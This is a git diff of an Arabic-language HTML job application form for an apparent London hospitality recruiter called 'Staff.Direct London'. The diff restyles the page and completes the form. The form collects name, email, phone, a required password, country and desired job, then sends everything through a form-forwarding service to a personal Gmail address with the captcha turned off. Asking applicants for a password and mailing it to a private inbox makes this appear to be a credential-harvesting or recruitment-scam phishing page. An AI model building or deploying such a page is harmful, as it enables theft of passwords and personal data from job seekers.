@@ -1,45 +1,74 @@
-<!DOCTYPE html> 
-<html lang="ar" dir="rtl"> 
-<head> 
-<meta charset="UTF-8"> 
-<meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-<title>Staff.Direct London - نموذج التوظيف</title> 
-<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet"> 
-<style> 
-:root { --navy: #0A1F44; --gold: #D4AF37; --orange: #F57C00; } 
-* {box-sizing: border-box; margin: 0; padding: 0;} 
-body { background: linear-gradient(135deg, var(--navy) 0%, #1a3a6e 100%); font-family: 'Cairo', sans-serif; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh;} 
-.container { background: #fff; max-width: 650px; width: 100%; padding: 40px 30px; border-radius: 20px; border-top: 6px solid var(--gold); box-shadow: 0 15px 50px rgba(0,0,0,0.4); text-align: center; }
-.logo-img { width: 160px; height: auto; margin: 0 auto 15px; }
-.brand {font-size: 28px; font-weight: 700; color: var(--navy);} 
-.subtitle {color: var(--orange); font-size: 12px; font-weight: 600; margin-bottom: 15px; letter-spacing: 1px;} 
-h2 {color: var(--navy); margin: 20px 0 8px; font-size: 24px;} 
-.desc {color: #666; margin-bottom: 25px; font-size: 14px;} 
-.form-group {text-align: right; margin-bottom: 18px;}
-label {display: block; color: var(--navy); font-weight: 600; font-size: 14px; margin-bottom: 6px;}
-input, select {width: 100%; padding: 14px 15px; border: 2px solid #eee; border-radius: 12px; font-family: 'Cairo'; font-size: 15px; background: #fafafa;} 
-input:focus, select:focus {border-color: var(--gold); outline: none; background: #fff;} 
-.btn {width: 100%; padding: 16px; background: linear-gradient(135deg, var(--gold) 0%, #B8860B 100%); color: var(--navy); border: none; border-radius: 12px; font-size: 18px; font-weight: 700; cursor: pointer; margin-top: 10px;}
-.btn:hover {transform: translateY(-2px);}
-</style> 
-</head> 
-<body> 
-<div class="container"> 
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Staff.Direct London - نموذج التوظيف</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+body {
+  background: #0A1F44;
+  font-family: 'Cairo', sans-serif;
+  padding: 20px;
+  margin: 0;
+  display: flex;
+  justify-content: center;
+  align-items: flex-start;
+  min-height: 100vh;
+}
+.container {
+  background: #fff;
+  max-width: 600px;
+  width: 100%;
+  padding: 30px 25px;
+  border-radius: 15px;
+  border-top: 5px solid #D4AF37;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+}
+.logo-img { width: 150px; display: block; margin: 0 auto 15px; }
+.brand {text-align: center; font-size: 26px; font-weight: 700; color: #0A1F44;}
+.subtitle {text-align: center; color: #F57C00; font-size: 12px; margin-bottom: 15px;}
+h2 {text-align: center; color: #0A1F44; margin: 15px 0 5px; font-size: 22px;}
+.desc {text-align: center; color: #666; margin-bottom: 20px; font-size: 14px;}
+.form-group {margin-bottom: 15px;}
+label {display: block; color: #0A1F44; font-weight: 600; font-size: 14px; margin-bottom: 5px; text-align: right;}
+input, select {
+  width: 100%;
+  padding: 12px;
+  border: 2px solid #ddd;
+  border-radius: 10px;
+  font-family: 'Cairo';
+  font-size: 15px;
+  text-align: right;
+}
+.btn {
+  width: 100%;
+  padding: 15px;
+  background: #D4AF37;
+  color: #0A1F44;
+  border: none;
+  border-radius: 10px;
+  font-size: 18px;
+  font-weight: 700;
+  cursor: pointer;
+  margin-top: 15px;
+}
+</style>
+</head>
+<body>
+<div class="container">
 
-<div class="header">
-  <img src="images.jpeg" alt="Staff.Direct Logo" class="logo-img">
-  <div class="brand">STAFF.DIRECT LONDON</div> 
-  <div class="subtitle">التوظيف في مجال الضيافة</div> 
-</div>
+<img src="images.jpeg" alt="Logo" class="logo-img">
+<div class="brand">STAFF.DIRECT LONDON</div>
+<div class="subtitle">التوظيف في مجال الضيافة</div>
 
-<h2>نموذج التقديم على وظيفة</h2> 
-<p class="desc">املأ النموذج أدناه وسيتواصل معك فريق التوظيف لدينا خلال 24 ساعة.</p> 
+<h2>نموذج التقديم على وظيفة</h2>
+<p class="desc">املأ النموذج أدناه وسيتواصل معك فريق التوظيف خلال 24 ساعة.</p>
 
 <form action="https://formsubmit.co/mosabshareef22@gmail.com" method="POST">
-  
-  <!-- ده بيرجعك لموقعك مباشرة بدون صفحة شكرا -->
+
   <input type="hidden" name="_next" value="https://kria22.github.io/">
-  <input type="hidden" name="_subject" value="طلب توظيف جديد - Staff.Direct London">
+  <input type="hidden" name="_subject" value="طلب توظيف جديد">
   <input type="hidden" name="_captcha" value="false">
 
   <div class="form-group">
@@ -48,7 +77,7 @@ input:focus, select:focus {border-color: var(--gold); outline: none; background:
   </div>
 
   <div class="form-group">
-    <label>* عنوان البريد الإلكتروني</label>
+    <label>* البريد الإلكتروني</label>
     <input name="Email" type="email" placeholder="example@email.com" required>
   </div>
 
@@ -58,5 +87,39 @@ input:focus, select:focus {border-color: var(--gold); outline: none; background:
   </div>
 
   <div class="form-group">
-    <label>* إنشاء كلمة مرور</label>
-   
+    <label>* كلمة المرور</label>
+    <input name="Password" type="password" placeholder="6 أحرف على الأقل" required>
+  </div>
+
+  <div class="form-group">
+    <label>* الدولة</label>
+    <select name="Country" required>
+      <option value="">اختر الدولة</option>
+      <option>مصر</option>
+      <option>السعودية</option>
+      <option>الإمارات</option>
+      <option>ليبيا</option>
+      <option>المملكة المتحدة</option>
+      <option>أخرى</option>
+    </select>
+  </div>
+
+  <div class="form-group">
+    <label>* الوظيفة</label>
+    <select name="Job Position" required>
+      <option value="">اختر الوظيفة</option>
+      <option>موظف استقبال</option>
+      <option>خدمة غرف</option>
+      <option>شيف</option>
+      <option>نادل</option>
+      <option>مدير فندق</option>
+      <option>أخرى</option>
+    </select>
+  </div>
+
+  <button type="submit" class="btn">إرسال الطلب</button>
+
+</form>
+</div>
+</body>
+</html>
